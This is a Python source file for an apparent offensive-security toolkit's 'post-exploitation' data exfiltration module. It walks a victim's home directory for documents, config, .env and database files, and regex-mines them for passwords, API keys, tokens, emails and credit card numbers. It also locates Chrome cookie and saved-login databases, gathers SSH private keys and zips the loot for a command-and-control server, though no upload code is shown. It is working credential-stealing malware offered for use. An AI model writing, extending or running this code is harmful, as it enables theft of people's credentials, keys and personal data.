"""
Post-Exploitation Module - Data Exfiltration
Searches for and exfiltrates sensitive data
"""

import os
import re
import zipfile
from typing import List, Dict
from pathlib import Path

from utils.logger import logger


class DataExfiltrator:
    """
    Data Exfiltration Module
    Searches for and collects sensitive data
    """
    
    def __init__(self, output_dir: str = "exfil_data"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        
        # File patterns to search for
        self.sensitive_patterns = {
            'credentials': [
                r'password\s*[:=]\s*["\']?([^"\'\s]+)',
                r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)',
                r'secret\s*[:=]\s*["\']?([^"\'\s]+)',
                r'token\s*[:=]\s*["\']?([^"\'\s]+)',
            ],
            'emails': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            ],
            'credit_cards': [
                r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
            ],
            'ssh_keys': [
                r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            ]
        }
        
        # File extensions to target
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx',
            '.pdf', '.key', '.pem', '.ppk', '.rdp',
            '.config', '.conf', '.ini', '.env',
            '.sql', '.db', '.sqlite', '.mdb'
        ]
        
        # Interesting directories
        self.target_dirs = [
            'Documents', 'Desktop', 'Downloads',
            '.ssh', '.aws', '.config', 'AppData'
        ]
    
    def search_files(self, root_dir: str = None, max_size_mb: int = 10) -> List[str]:
        """
        Search for interesting files
        
        Args:
            root_dir: Root directory to search (default: user home)
            max_size_mb: Maximum file size to collect in MB
        
        Returns:
            List of file paths
        """
        if root_dir is None:
            root_dir = os.path.expanduser('~')
        
        logger.info(f"Searching for sensitive files in {root_dir}")
        
        interesting_files = []
        max_size = max_size_mb * 1024 * 1024
        
        try:
            for dirpath, dirnames, filenames in os.walk(root_dir):
                # Skip certain directories
                dirnames[:] = [d for d in dirnames if not d.startswith('.git')]
                
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    
                    try:
                        # Check file extension
                        if any(filename.endswith(ext) for ext in self.target_extensions):
                            # Check file size
                            if os.path.getsize(filepath) <= max_size:
                                interesting_files.append(filepath)
                                logger.debug(f"Found: {filepath}")
                    except:
                        continue
        
        except Exception as e:
            logger.error(f"File search error: {e}")
        
        logger.info(f"Found {len(interesting_files)} interesting files")
        return interesting_files
    
    def extract_credentials(self, file_path: str) -> Dict:
        """
        Extract credentials from file
        
        Args:
            file_path: Path to file
        
        Returns:
            Dict of found credentials
        """
        findings = {
            'file': file_path,
            'credentials': [],
            'emails': [],
            'credit_cards': [],
            'ssh_keys': []
        }
        
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
            
            # Search for patterns
            for category, patterns in self.sensitive_patterns.items():
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        findings[category].extend(matches)
            
            # Remove duplicates
            for key in findings:
                if isinstance(findings[key], list):
                    findings[key] = list(set(findings[key]))
        
        except Exception as e:
            logger.debug(f"Error extracting from {file_path}: {e}")
        
        return findings
    
    def collect_browser_data(self) -> Dict:
        """Collect browser data (cookies, passwords, history)"""
        logger.info("Collecting browser data")
        
        browser_data = {
            'chrome': self._collect_chrome_data(),
            'firefox': self._collect_firefox_data(),
            'edge': self._collect_edge_data()
        }
        
        return browser_data
    
    def _collect_chrome_data(self) -> Dict:
        """Collect Chrome data"""
        chrome_paths = {
            'Windows': os.path.join(os.getenv('LOCALAPPDATA', ''), 
                                   'Google', 'Chrome', 'User Data', 'Default'),
            'Linux': os.path.expanduser('~/.config/google-chrome/Default'),
            'Darwin': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
        }
        
        import platform
        chrome_path = chrome_paths.get(platform.system())
        
        data = {'cookies': None, 'history': None, 'passwords': None}
        
        if chrome_path and os.path.exists(chrome_path):
            # Collect database files
            for db_name in ['Cookies', 'History', 'Login Data']:
                db_path = os.path.join(chrome_path, db_name)
                if os.path.exists(db_path):
                    data[db_name.lower().replace(' ', '_')] = db_path
                    logger.debug(f"Found Chrome {db_name}")
        
        return data
    
    def _collect_firefox_data(self) -> Dict:
        """Collect Firefox data"""
        # Similar to Chrome collection
        return {}
    
    def _collect_edge_data(self) -> Dict:
        """Collect Edge data"""
        # Similar to Chrome collection
        return {}
    
    def collect_ssh_keys(self) -> List[str]:
        """Collect SSH private keys"""
        logger.info("Collecting SSH keys")
        
        ssh_dir = os.path.expanduser('~/.ssh')
        keys = []
        
        if os.path.exists(ssh_dir):
            for filename in os.listdir(ssh_dir):
                filepath = os.path.join(ssh_dir, filename)
                
                if os.path.isfile(filepath):
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()
                            if 'PRIVATE KEY' in content:
                                keys.append(filepath)
                                logger.success(f"Found SSH key: {filename}")
                    except:
                        continue
        
        return keys
    
    def package_data(self, files: List[str], output_name: str = "exfil_package.zip") -> str:
        """
        Package collected data into encrypted archive
        
        Args:
            files: List of files to package
            output_name: Output archive name
        
        Returns:
            Path to created archive
        """
        output_path = os.path.join(self.output_dir, output_name)
        
        logger.info(f"Packaging {len(files)} files into {output_path}")
        
        try:
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_path in files:
                    try:
                        arcname = os.path.basename(file_path)
                        zipf.write(file_path, arcname)
                    except Exception as e:
                        logger.debug(f"Failed to add {file_path}: {e}")
            
            logger.success(f"Package created: {output_path}")
            return output_path
        
        except Exception as e:
            logger.error(f"Failed to create package: {e}")
            return None
    
    def exfiltrate(self, c2_server: str = None) -> Dict:
        """
        Full exfiltration process
        
        Args:
            c2_server: C2 server to send data to
        
        Returns:
            Summary of exfiltration
        """
        logger.info("Starting data exfiltration")
        
        summary = {
            'files_found': 0,
            'credentials_found': 0,
            'ssh_keys_found': 0,
            'package_created': False
        }
        
        # Search for files
        files = self.search_files()
        summary['files_found'] = len(files)
        
        # Extract credentials
        all_credentials = []
        for file_path in files[:100]:  # Limit to first 100 files
            creds = self.extract_credentials(file_path)
            if any(creds.values()):
                all_credentials.append(creds)
        
        summary['credentials_found'] = len(all_credentials)
        
        # Collect SSH keys
        ssh_keys = self.collect_ssh_keys()
        summary['ssh_keys_found'] = len(ssh_keys)
        
        # Package data
        if files:
            package_path = self.package_data(files[:50])  # Package first 50 files
            summary['package_created'] = package_path is not None
            summary['package_path'] = package_path
        
        logger.info(f"Exfiltration complete: {summary}")
        return summary


if __name__ == "__main__":
    exfiltrator = DataExfiltrator()
    
    print("="*60)
    print("DATA EXFILTRATION TEST")
    print("="*60)
    
    # Search for files
    files = exfiltrator.search_files(max_size_mb=5)
    print(f"Found {len(files)} files")
    
    # Collect SSH keys
    keys = exfiltrator.collect_ssh_keys()
    print(f"Found {len(keys)} SSH keys")
    
    print("="*60)
